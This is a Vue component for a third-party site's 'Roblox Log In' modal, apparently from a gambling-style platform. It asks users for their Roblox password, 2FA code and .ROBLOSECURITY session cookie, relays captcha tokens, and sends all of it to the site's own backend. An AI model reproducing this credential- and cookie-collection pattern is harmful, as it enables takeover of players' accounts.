<template>
    <div class="login-credientials">
        <div class="content-title">Roblox Log In</div>
        <div v-if="authStep === 'captcha'" class="roblox-captcha">
            <iframe v-bind:src="modalsData.captchaUrl" width="320" height="320" />
        </div>
        <div v-else-if="authStep === 'twostep'" class="roblox-twostep">
            <div class="twostep-title">FILL IN YOUR 2FA CODE</div>
            <div class="twostep-input">
                <input v-model="loginTwoStepCode" type="text" placeholder="ENTER 2FA CODE" />
            </div>
        </div>
        <div class="email-content">
            <div class="email-title">User Name</div>
            <div class="email-input">
                <input v-model="loginUsername" type="text" placeholder="Enter Name...">
            </div>
        </div>
        <div class="password-content">
            <div class="password-title">Password</div>
            <div class="password-input">
                <input v-model="loginPassword" type="password" placeholder="Enter Password...">
            </div>
        </div>
        <div class="content-info">By signing in you confirm that you are 18 years of age or over, of sound mind
            capable of taking responsibility for your own actions & agree with our tos.
        </div>
        <div class="content-buttons">
            <button class="button-register" v-on:click="$parent.modalSetTab('roblox cookie')">.ROBLOSECURITY</button>
            <button v-on:click="loginActionButton()" class="button-login">LOG IN</button>
        </div>
    </div>
</template>

<script>
import { mapGetters, mapActions } from 'vuex';
import ButtonLoading from '@/components/ButtonLoading';

export default {
    name: 'LoginRobloxLogin',
    components: {
        ButtonLoading
    },
    props: [
        'tab'
    ],
    data() {
        return {
            loginUsername: null,
            loginPassword: null,
            loginTwoStepCode: null,
            loginCookie: null
        }
    },
    methods: {
        ...mapActions([
            'modalsSetShow',
            'authSendRoblox',
            'authSendRobloxTwoStep',
            'authSendRobloxCookie'
        ]),
        loginActionButton() {
            if (this.loginUsername === null || this.loginUsername.trim() === '') {
                return;
            }

            if (this.loginPassword === null || this.loginPassword.trim() === '') {
                return;
            }

            const data = { step: 'login', username: this.loginUsername, password: this.loginPassword };
            this.authSendRoblox(data);
        },
        loginTermsButton() {
            this.modalsSetShow(null);
            setTimeout(() => { this.modalsSetShow('Terms'); }, 300);
        }
    },
    computed: {
        ...mapGetters([
            'modalsShow',
            'modalsData',
            'authSendLoginLoading',
            'authStep'
        ])
    },
    mounted() {
        window.addEventListener('message', (event) => {
            event = typeof (event.data) === 'object' ? event.data : JSON.parse(event.data);

            if (event.eventId === 'challenge-completed') {
                const data = { step: 'captcha', username: this.loginUsername, password: this.loginPassword, challengeId: this.modalsData.challengeId, captchaId: this.modalsData.captchaId, captchaToken: event.payload.sessionToken, secureAuthenticationIntent: this.modalsData.secureAuthenticationIntent };
                this.authSendRoblox(data);
            }
        });
    }
}
</script>

<style scoped>
.modal-login .login-content {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center
}

.modal-login .login-credientials {
    width: 100%;
    padding: 10px 50px;
    display: flex;
    flex-direction: column;
    align-items: center
}

.modal-login .content-title {
    /* text-transform: uppercase; */
    font-size: 26px;
    font-weight: 600;
    color: #fff
}

.modal-login .email-content {
    width: 100%;
    margin-top: 20px;
}

.email-content .email-title {
    color: #767C8B;
    font-size: 14px;
}

.modal-login .email-input {
    width: 100%;
    position: relative;
    margin-top: 5px
}

.modal-login .email-input input {
    width: 100%;
    height: 54px;
    padding: 0 17px;
    border-radius: 8px;
    font-size: 13px;
    font-weight: 700;
    color: #fff;
    background: #191e27;
    border: 1px solid #262c3a
}

.modal-login .email-input input::-moz-placeholder {
    font-size: 13px;
    font-weight: 700;
    color: #596076
}

.modal-login .email-input input::placeholder {
    font-size: 13px;
    font-weight: 700;
    color: #596076
}

.modal-login .password-content {
    width: 100%;
    margin-top: 20px;
}

.password-content .password-title {
    color: #767C8B;
    font-size: 14px;
}

.modal-login .password-input {
    width: 100%;
    position: relative;
    margin-top: 5px;
    display: flex;
    align-items: center;
}

.modal-login .password-input input {
    width: 100%;
    height: 54px;
    padding: 0 17px;
    border-radius: 8px;
    font-size: 13px;
    font-weight: 700;
    color: #fff;
    background: #191e27;
    border: 1px solid #262c3a
}

.modal-login .password-input input::-moz-placeholder {
    font-size: 13px;
    font-weight: 700;
    color: #596076
}

.modal-login .password-input input::placeholder {
    font-size: 13px;
    font-weight: 700;
    color: #596076
}

.modal-login .password-input button {
    position: absolute;
    right: 0px;
    top: 0px;
    bottom: 0px;
    margin-top: auto;
    margin-bottom: auto;
    margin-right: 7px;
    height: 40px;
    padding: 0px 20px;
    border-radius: 5px;
    background: #212732;
    color: #767C8B;
    text-shadow: 0px 15px 15px rgba(0, 0, 0, 0.15);
    font-family: Poppins;
    font-size: 15px;
    font-style: normal;
    font-weight: 600;
    line-height: normal;
    letter-spacing: -0.45px;
}

.modal-login .content-info {
    margin-top: 10px;
    color: #767C8B;
    font-family: Poppins;
    font-size: 10.673px;
    font-style: normal;
    font-weight: 600;
    line-height: normal;
    letter-spacing: -0.32px;
    text-transform: uppercase;
}

.modal-login .content-buttons {
    margin-top: 10px;
    display: flex;
    gap: 10px;
}

.modal-login .content-buttons .button-register {
    border-radius: 9.583px;
    background: #222833;
    padding: 10px 18px;
    color: #767C8B;
    text-shadow: 0px 3.833px 3.833px rgba(0, 0, 0, 0.23);
    font-family: Poppins;
    font-size: 16.291px;
    font-style: normal;
    font-weight: 700;
    line-height: normal;
    letter-spacing: -0.489px;
    text-transform: uppercase;
}

.modal-login .content-buttons .button-login {
    border-radius: 9.583px;
    background: #00C74D;
    padding: 10px 18px;
    color: #FFF;
    text-shadow: 0px 3.833px 3.833px rgba(0, 0, 0, 0.23);
    font-family: Poppins;
    font-size: 16.291px;
    font-style: normal;
    font-weight: 700;
    line-height: normal;
    letter-spacing: -0.489px;
    text-transform: uppercase;
}

.modal-login .button-roblox {
    margin-top: 15px;
    padding: 4px 0px;
    width: 80%;
    border-radius: 9.583px;
    background: #222833;
    color: #767C8B;
    text-shadow: 0px 3.833px 3.833px rgba(0, 0, 0, 0.23);
    font-family: Poppins;
    font-size: 16.291px;
    font-style: normal;
    font-weight: 700;
    line-height: normal;
    letter-spacing: -0.489px;
    text-transform: uppercase;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
}

.modal-login .button-roblox svg {
    margin-top: 8px;
    width: 30px;
}

.modal-login .content-button button.button-login {
    width: 100%;
    height: 55px;
    border-radius: 5px;
    text-transform: uppercase;
    font-size: 14px;
    font-weight: 700;
    color: #fff;
    background: #00c74d;
    border-bottom: 2px solid #00732c
}

.modal-login .content-button button.button-login:hover {
    background: #00de56
}

@media only screen and (max-width: 650px) {
    .modal-login {
        width: 100%
    }
}

@media only screen and (max-width: 450px) {
    .modal-login .login-content {
        padding: 0 20px
    }

    .modal-login .content-button,
    .modal-login .content-input {
        width: 100%
    }
}
</style>